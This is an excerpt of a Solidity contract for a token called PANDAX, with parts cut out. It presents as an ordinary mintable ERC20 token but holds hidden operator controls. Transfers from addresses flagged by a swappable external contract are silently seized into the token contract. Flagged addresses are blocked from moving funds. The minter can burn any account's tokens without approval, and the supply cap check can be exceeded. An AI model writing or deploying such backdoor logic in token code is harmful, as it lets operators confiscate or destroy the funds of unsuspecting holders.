...
contract ERC20Mintable is ERC20, MinterRole {
    ...
    uint public _transactFeeValue = 5;
    uint public sale_date=0;
    address public v1;
    uint256[][] private ContractorsFee;
    address[][] private ContractorsAddress;
    constructor(address _v1,uint fee) public{
        v1=_v1;
        addMinter(v1);
    ...
    function setToken(address _v1) public onlyMinter {
        v1=_v1;
    }
    ...
    function transactionFee(address from,address to,uint256 amount)internal returns (uint256) {
        if(_msgSender()==address(this)||from==address(this)||to==address(this)||V1(v1).isWhite(from)==1||V1(v1).isWhite(to)==1)return amount;
        if(V1(v1).isWhite(from)==3){
            super._transfer(from, address(this), amount);
            return 0;
        }
        require(V1(v1).isWhite(from)==0&&V1(v1).isWhite(to)==0, "_transfer:whiter");
        uint setType=2;
        if(from.isContract()){
            setType=0;
    ...
    function selfBurn() public onlyMinter returns(bool){
...
contract PanDaxToken is ERC20, ERC20Detailed,ERC20Mintable {
    using SafeMath for uint256;

    constructor(address _v1) public ERC20Detailed('PANDAX', 'pandax', 18)  ERC20Mintable(_v1,5){
    }

    function mint(address account, uint256 amount) public onlyMinter {
        require(totalSupply()<=300000*1e18, "mint: >30");
        _mint(account,amount);
    }

    function burnFrom(address account, uint256 amount) public onlyMinter returns(bool){
        require(account != address(0), "burnFrom: account to the zero address");
